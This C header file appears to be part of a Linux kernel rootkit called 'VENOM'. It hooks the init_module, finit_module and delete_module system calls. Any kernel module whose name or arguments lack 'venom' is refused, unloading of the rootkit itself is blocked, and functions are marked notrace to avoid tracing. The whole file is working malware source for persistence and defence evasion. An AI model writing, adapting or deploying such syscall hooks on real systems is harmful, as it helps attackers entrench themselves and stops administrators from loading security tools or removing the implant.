#ifndef INSMOD_H
#define INSMOD_H

#include "../include/headers.h"


static asmlinkage long (*orig_init_module)(const struct pt_regs *regs);
static asmlinkage long (*orig_finit_module)(const struct pt_regs *regs);

static const char *allowed_modules[] = {
    "venom", 
    NULL
};

notrace static int is_module_allowed(const char *module_name) {
    int i;
    
    if (!module_name)
        return 0;
    
    for (i = 0; allowed_modules[i] != NULL; i++) {
        if (strstr(module_name, allowed_modules[i])) {
            return 1;
        }
    }
    
    return 0;
}

notrace static char *get_module_name_from_data(void __user *umod, unsigned long len) {
    char *kernel_buf;
    char *module_name = NULL;
    struct module *mod_info;
    
    if (len > 1024 * 1024) 
        return NULL;
    
    kernel_buf = kmalloc(len, GFP_KERNEL);
    if (!kernel_buf)
        return NULL;
    
    if (copy_from_user(kernel_buf, umod, len)) {
        kfree(kernel_buf);
        return NULL;
    }
    
    mod_info = (struct module *)kernel_buf;
    if (mod_info && mod_info->name[0]) {
        module_name = kstrdup(mod_info->name, GFP_KERNEL);
    }
    
    kfree(kernel_buf);
    return module_name;
}


notrace static asmlinkage long hooked_init_module(const struct pt_regs *regs) {
    void __user *umod = (void __user *)regs->di;
    unsigned long len = regs->si;
    const char __user *uargs = (const char __user *)regs->dx;
    char *module_name;
    char args[256] = {0};
    

    if (uargs && strncpy_from_user(args, uargs, sizeof(args) - 1) > 0) {
        if (is_module_allowed(args)) {
            return orig_init_module(regs);
        }
    }
    
    module_name = get_module_name_from_data(umod, len);
    if (module_name) {
        if (is_module_allowed(module_name)) {
            kfree(module_name);
            return orig_init_module(regs);
        }
        kfree(module_name);
    }
    

    printk(KERN_WARNING "[VENOM] Blocked unauthorized module load attempt (init_module) from PID %d UID %d\n", current->pid, current_uid().val);
    
    return -EPERM; 
}


notrace static asmlinkage long hooked_finit_module(const struct pt_regs *regs) {
    int fd = (int)regs->di;
    const char __user *uargs = (const char __user *)regs->si;
    char args[256] = {0};
    char filename[256] = {0};
    struct file *file;
    
    file = fget(fd);
    if (file) {
        if (file->f_path.dentry && file->f_path.dentry->d_name.name) {
            strncpy(filename, file->f_path.dentry->d_name.name, sizeof(filename) - 1);
            
            if (is_module_allowed(filename)) {
                fput(file);
                return orig_finit_module(regs);
            }
        }
        fput(file);
    }
    
    if (uargs && strncpy_from_user(args, uargs, sizeof(args) - 1) > 0) {
        if (is_module_allowed(args)) {
            return orig_finit_module(regs);
        }
    }
    

    // printk(KERN_WARNING "[VENOM] Blocked unauthorized module load attempt (finit_module) from PID %d UID %d: %s\n", current->pid, current_uid().val, filename[0] ? filename : "unknown");
    
    return -EPERM;  
}


static asmlinkage long (*orig_delete_module)(const struct pt_regs *regs);

notrace static asmlinkage long hooked_delete_module(const struct pt_regs *regs) {
    const char __user *name_user = (const char __user *)regs->di;
    char module_name[256] = {0};

    if (name_user && strncpy_from_user(module_name, name_user, sizeof(module_name) - 1) > 0) {
        if (is_module_allowed(module_name)) {
            printk(KERN_WARNING "[VENOM] Blocked attempt to unload protected module: %s from PID %d\n", module_name, current->pid);
            return -EPERM;
        }
    }
    

    return orig_delete_module(regs);
}

#endif 
